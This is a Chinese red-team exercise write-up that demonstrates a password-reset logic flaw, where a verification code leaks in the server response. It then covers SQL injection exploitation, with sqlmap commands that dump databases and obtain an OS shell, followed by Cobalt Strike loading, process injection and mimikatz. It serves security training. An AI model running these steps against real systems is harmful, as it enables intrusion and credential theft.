在壹篇中主要讲了弱口令漏洞在攻防演练中的利用，有朋友可能会觉得弱口令漏洞非常简单，为什么还要讲它呢？理由是虽然弱口令漏洞非常简单，但是在攻防演练环境下还是普遍存在的，因此针对未知系统我会优先尝试弱口令。尽管现在随着网络安全意识的普及，大部分单位或公司都使用8位以上且包含各种字符的强口令，但由于使用随机字符的强口令实在反人类，普通人根本无法记住它们，因此为了合规会设置相对好记的口令，比如哥谭市财政局，其系统口令就有可能是`gtcz@2022`，这种伪强口令其实还是属于弱口令的范畴当中，攻击者配合工具可轻易猜到它们，同时在目标未登记的老资产中也会存在一些默认口令、弱口令，当我们信息收集做的足够好时就能发现它们，从而进入应用获取权限。本文主要介绍我在攻防演练中遇到的两个实战思路，分别是逻辑漏洞和SQL注入的利用。

## 0x01 逻辑漏洞

在资产收集时 fofa 是一个非常不错的工具，比如针对哥谭市的攻防演练，在实在找不到其他资产的情况下，可以使用`title="哥谭"`搜索全部与哥谭市相关的网络资产，导出后再筛选即可发现一些与目标相关联的系统，通过以上方式成功找到如下登录界面：![](../Images/b3ee5024035d9bcfcefe2d0a221d1a77.png)

通过目录扫描发现日志路径为`/logfile`，检查后发现用户名`phtyxx`以及手机号![](../Images/73afdc01be938378ff3f2315c4dc0480.png)

在登录界面中选择忘记密码，输入日志中泄露的用户名![](../Images/e328855b16079fb09a03e8f561771245.png)

完成后输入手机号，点击发送验证码![](../Images/797cb4d86c961d2b3b06231ed932bf3a.png)

在 BurpSuite 的历史记录下发现响应包中存在验证码![](../Images/e69ddc92f874567d58c3bba6ec1b7c88.png)

输入验证码`194694`后输入新密码完成密码修改，最终成功以管理员身份登录系统![](../Images/5a4f0e2138a4a82cc8439a9d2a001c6b.png)

## 0x02 SQL注入

### 数据库权限

在 AWVS 扫描报告里发现目标网站存在注入，验证漏洞成功

```

http://x.x.x.x:8010/display.asp?vkind=1%27
```

![](../Images/c5162f066613ae5d8c87692d15cc8a26.png)

使用 sqlmap 查询全部数据库，成功返回多个数据库名

```

sqlmap -u "http://x.x.x.x:8010/display.asp?vkind=1" --dbs
```

![](../Images/b5fba102057071d0fd42f3d83a0966aa.png)

查看当前用户为`sa`，即成功拿到数据库中的 DBA 权限

```

sqlmap -u "http://x.x.x.x:8010/display.asp?vkind=1" --current-user
```

![](../Images/94081d10002381e7f36a3e7100e6fe8e.png)

使用`--count`参数可计算各个数据库中存在多少条数据，可方便我们计算数据分数

```

sqlmap -u "http://x.x.x.x:8010/display.asp?vkind=1" -D pdata --count
```

![](../Images/d90db8604c271a45080e8439840d995a.png)

使用`--tables`可获取数据库中的表名，同理使用`--columns`可获取表中的列名

```


sqlmap -u "http://x.x.x.x:8010/display.asp?vkind=1" -D video --tables
```

![](../Images/c8a5897ab1eed952520d69a5588934b8.png)

使用`--dump`参数查看表中的所有数据

```

sqlmap -u "http://x.x.x.x:8010/display.asp?vkind=1" -D pdata -T students --dump
```

![](../Images/41c131158a2163c237740740d9f4114f.png)

在数据库中可能会存在敏感的密码、API信息，为了方便查看可将整个数据库导出后再筛选

### 服务器权限

如果想要通过 MSSQL 数据库提权，最常见的方式就是开启`xp_cmdshell`组件，而在 sqlmap 中使用`--os-shell`参数默认会利用该组件获取服务器权限；假如想要执行数据库命令，可使用`--sql-shell`参数。

```

sqlmap -u "http://x.x.x.x:8010/display.asp?vkind=1" --os-shell
```

![](../Images/22a0a5328f1df6998e0eb88a81066397.png)

成功拿到服务器系统权限，同时发现其IP地址为`192.168.11.2`![](../Images/3ace1a4ee3df0d1e21242da4cc106ee5.png)

利用 powershell 无文件落地上线CS![](../Images/c6a155054a9649653cbc26730dae08ec.png)

查看目标是否存在域环境

```

shell ipconfig /all
```

![](../Images/f3eb0e1b55dfff41abaaf29840f7a53d.png)

查看进程并尝试注入到其他正常系统程序当中

```

inject 4884 x64
```

![](../Images/59e0a5f0b2fe3a28592e9c60bf679b2b.png)

执行 mimikatz 成功获取明文密码

```

```

## 0x03 总结

总体来说以上两个案例还是采用的常规思路，其中第一个案例中出现的逻辑漏洞为验证码缺陷，配合敏感信息泄露可达到修改用户密码的效果；第二个案例则是利用SQL注入提权获取服务器权限，建立代理后可进入内网刷分。幸运的是在攻击过程中并没遇到防护设备或防守人员的拦截，整个流程相对来说还算比较简单、流畅。只有实践才是检验真理的唯一标准，攻防演练就是一个非常不错的平台，欢迎各位大佬交流相关的心得体会。
